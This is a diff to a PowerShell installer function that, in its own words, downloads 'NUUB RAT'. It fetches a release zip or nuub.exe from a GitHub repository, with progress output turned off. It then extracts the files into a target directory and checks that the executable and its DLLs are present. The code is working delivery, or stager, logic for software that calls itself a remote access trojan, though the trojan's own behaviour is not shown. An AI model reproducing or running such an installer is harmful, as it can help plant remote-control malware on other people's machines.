@@ -148,7 +148,15 @@ function Get-NuubBinary {
 
     Write-Step "1/6" "Downloading NUUB RAT"
 
-    # Determine download URL
+    # Create target directory
+    if (-not (Test-Path $TargetDir)) {
+        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
+    }
+
+    # Determine download URL - prefer zip (contains DLLs)
+    $downloadUrl = $null
+    $isZip = $false
+
     if ($Version -eq "latest") {
         $releaseUrl = "https://api.github.com/repos/$Repo/releases/latest"
         try {
@@ -156,55 +164,79 @@ function Get-NuubBinary {
             $tagName = $release.tag_name
             Write-Info "Latest release: $tagName"
 
-            # Find nuub.exe asset
-            $asset = $release.assets | Where-Object { $_.name -eq "nuub.exe" } | Select-Object -First 1
-            if (-not $asset) {
-                # Fallback: look for zip containing nuub.exe
-                $zipAsset = $release.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1
-                if ($zipAsset) {
-                    $downloadUrl = $zipAsset.browser_download_url
+            # Find zip asset first (contains DLLs needed to run)
+            $zipAsset = $release.assets | Where-Object { $_.name -like "nuub-*.zip" -or $_.name -like "*.zip" } | Select-Object -First 1
+            if ($zipAsset) {
+                $downloadUrl = $zipAsset.browser_download_url
+                $isZip = $true
+                Write-Info "Found zip release: $($zipAsset.name)"
+            } else {
+                # Fallback to standalone exe
+                $asset = $release.assets | Where-Object { $_.name -eq "nuub.exe" } | Select-Object -First 1
+                if ($asset) {
+                    $downloadUrl = $asset.browser_download_url
+                    Write-Warn "No zip found, downloading standalone exe (may need DLLs)"
                 } else {
-                    Write-Err "No nuub.exe or .zip found in release $tagName"
-                    Write-Info "Available assets: $($release.assets.name -join ', ')"
+                    Write-Err "No release assets found in $tagName"
                     exit 1
                 }
-            } else {
-                $downloadUrl = $asset.browser_download_url
             }
         } catch {
             Write-Err "Failed to fetch release info from GitHub: $_"
-            Write-Info "Falling back to direct URL pattern..."
-            $downloadUrl = "https://github.com/$Repo/releases/latest/download/nuub.exe"
+            exit 1
         }
     } else {
-        $downloadUrl = "https://github.com/$Repo/releases/download/$Version/nuub.exe"
+        # Try zip first, fallback to exe
+        $zipUrl = "https://github.com/$Repo/releases/download/$Version/nuub-$Version.zip"
+        try {
+            $ProgressPreference = 'SilentlyContinue'
+            $resp = Invoke-WebRequest -Uri $zipUrl -Method Head -UseBasicParsing -ErrorAction Stop
+            $downloadUrl = $zipUrl
+            $isZip = $true
+        } catch {
+            $downloadUrl = "https://github.com/$Repo/releases/download/$Version/nuub.exe"
+        }
     }
-
-    # Create target directory
-    if (-not (Test-Path $TargetDir)) {
-        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
-    }
-
-    $exePath = Join-Path $TargetDir "nuub.exe"
 
     # Download
     Write-Info "Downloading from: $downloadUrl"
+    $ProgressPreference = 'SilentlyContinue'
     try {
-        $ProgressPreference = 'SilentlyContinue'  # Speed up Invoke-WebRequest
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
+        if ($isZip) {
+            $tempZip = Join-Path $env:TEMP "nuub_release.zip"
+            Invoke-WebRequest -Uri $downloadUrl -OutFile $tempZip -UseBasicParsing
+
+            # Extract to target directory
+            Expand-Archive -Path $tempZip -DestinationPath $TargetDir -Force
+            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+            Write-OK "Downloaded and extracted release to $TargetDir"
+        } else {
+            $exePath = Join-Path $TargetDir "nuub.exe"
+            Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
+        }
         $ProgressPreference = 'Continue'
     } catch {
         Write-Err "Download failed: $_"
+        $ProgressPreference = 'Continue'
         exit 1
     }
 
+    $exePath = Join-Path $TargetDir "nuub.exe"
     if (-not (Test-Path $exePath)) {
-        Write-Err "Downloaded file not found at $exePath"
+        Write-Err "nuub.exe not found at $exePath after download"
         exit 1
     }
 
     $size = (Get-Item $exePath).Length / 1MB
-    Write-OK "Downloaded nuub.exe ($([math]::Round($size, 2)) MB) to $TargetDir"
+    Write-OK "nuub.exe ready ($([math]::Round($size, 2)) MB) in $TargetDir"
+
+    # Verify DLLs are present
+    $dlls = Get-ChildItem -Path $TargetDir -Filter "*.dll" -ErrorAction SilentlyContinue
+    if ($dlls) {
+        Write-OK "$($dlls.Count) DLLs found alongside exe"
+    } else {
+        Write-Warn "No DLLs found - exe may fail to run if runtime dependencies are missing"
+    }
 
     return $exePath
 }
